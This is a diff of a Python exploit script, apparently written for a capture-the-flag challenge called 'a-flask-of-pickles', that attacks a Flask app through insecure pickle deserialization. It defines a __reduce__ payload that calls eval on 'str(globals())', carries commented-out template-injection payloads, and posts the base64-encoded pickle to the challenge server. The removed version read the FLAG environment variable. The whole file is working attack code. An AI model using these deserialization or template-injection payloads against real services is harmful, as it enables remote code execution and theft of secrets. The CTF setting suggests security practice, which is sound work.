@@ -1,15 +1,20 @@
 import pickle
-from flask import render_template
+import requests
 import base64
+url = "https://a-flask-of-pickles.litctf.live/"
 
 
-class PayloadGen(object):
+class Exploit():
     def __reduce__(self):
-        import os
-        return (os.getenv, ('FLAG',))
+        #from flask import render_template_string
+        # return render_template_string, ("{{url_for.__globals__.current_app.__dict__.listdir('./')}}",)
+        # return render_template_string, ("{{ [].class.base.subclasses() }}",)
+        return eval, ('str(globals())',)
 
 
-if __name__ == '__main__':
-    obj = {'name': PayloadGen()}
-    dmp = pickle.dumps(obj)
-    print(base64.urlsafe_b64encode(dmp))
+payload = pickle.dumps({'name': '', 'bio': Exploit()})
+print(payload, len(payload))
+payload_enc = base64.b64encode(payload)
+print(payload_enc, len(payload_enc))
+resp = requests.post(url + "new", data=payload_enc)
+print(url + resp.text)
